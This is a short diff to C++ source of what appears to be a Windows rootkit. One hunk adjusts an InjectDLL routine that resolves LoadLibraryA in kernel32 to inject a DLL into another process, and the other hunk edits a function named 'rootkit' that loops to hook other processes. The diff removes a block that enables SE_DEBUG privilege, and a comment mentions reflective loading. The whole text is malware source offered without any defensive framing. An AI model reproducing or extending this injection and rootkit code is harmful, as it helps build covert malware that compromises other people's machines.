@@ -927,7 +927,7 @@ DWORD InjectDLL(char * dllpath, DWORD pid, DWORD mypid, BOOL isrunning64) {
         } CLIENT_ID, * PCLIENT_ID;
         if (isrunning64) {
             std::error_code ec;
-            auto            kernel32 = wow64pp::module_handle("kernel32.dll");
+            auto            kernel32 = wow64pp::module_handle("kernel32");
             if (ec) return -3;
             PVOID LoadLibAddr = (PVOID)wow64pp::import(kernel32, "LoadLibraryA", ec);
             if (ec) return -4;
@@ -1212,15 +1212,6 @@ DWORD WINAPI rootkit(LPARAM none) {
 	// check if the library has a ReflectiveLoader...
 	//char *lpBuff = getFileContent(dllinstallpath);
 
-    LUID luid;
-    HANDLE token_handle;
-    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
-    TOKEN_PRIVILEGES tp;
-    tp.Privileges[0].Luid = luid;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    tp.PrivilegeCount = 1;
-    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token_handle);
-    AdjustTokenPrivileges(token_handle, false, &tp, sizeof(tp), NULL, NULL);
     DWORD mypid = GetCurrentProcessId(); //mypid is used for making sure we dont hook our own process
    
 	while (1) {
